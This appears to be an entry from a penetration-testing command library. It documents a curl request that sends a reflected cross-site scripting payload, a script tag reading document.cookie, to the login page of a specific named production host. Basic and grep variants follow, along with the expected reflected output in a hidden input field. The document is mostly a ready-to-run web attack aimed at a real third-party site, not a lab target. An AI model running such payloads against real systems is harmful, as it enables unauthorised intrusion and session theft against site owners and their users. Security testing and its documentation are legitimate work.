---
id: cmd-access-xss-url
data: >-
  curl -X GET
  "https://inventory.upserve.com/login/?'\"--><script>confirm(document.cookie)</script>"
  -v
tags:
  - xss
  - web-test
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:56:03.497Z'
verified: false
validated: true
submitted: true
---
# access-malicious-xss-url

## Command

```bash
curl -X GET "https://inventory.upserve.com/login/?'\"--><script>confirm(document.cookie)</script>" -v
```

## Description

This command uses curl to send a GET request to the target login endpoint with a reflected XSS payload in the query string, simulating the injection. It helps verify if the payload is reflected in the response HTML without executing it (execution requires a browser). Use this for initial testing before browser validation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method as GET | Yes |
| URL | The full target URL with encoded payload | Yes |
| `-v` | Verbose mode to show request/response details | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://inventory.upserve.com/login/?'\"--><script>alert(1)</script>" -v
```

### Advanced Usage

```bash
curl -X GET "https://inventory.upserve.com/login/?'\"--><script>confirm(document.cookie)</script>" -v | grep -i script
```

> This pipes output to grep for quick confirmation of script reflection.

## Expected Output

Verbose curl output showing the HTTP request headers, response status (200 OK), and HTML body with the reflected payload visible in a hidden input field, e.g., <input type="hidden" value="...?'><script>confirm(document.cookie)</script>">. No JavaScript execution occurs in curl; check for the injection in the response body.

## Related

- [[Related Procedure|procedures/Exploit-Reflected-XSS-in-Hidden-Field-via-REQUEST-URI]]
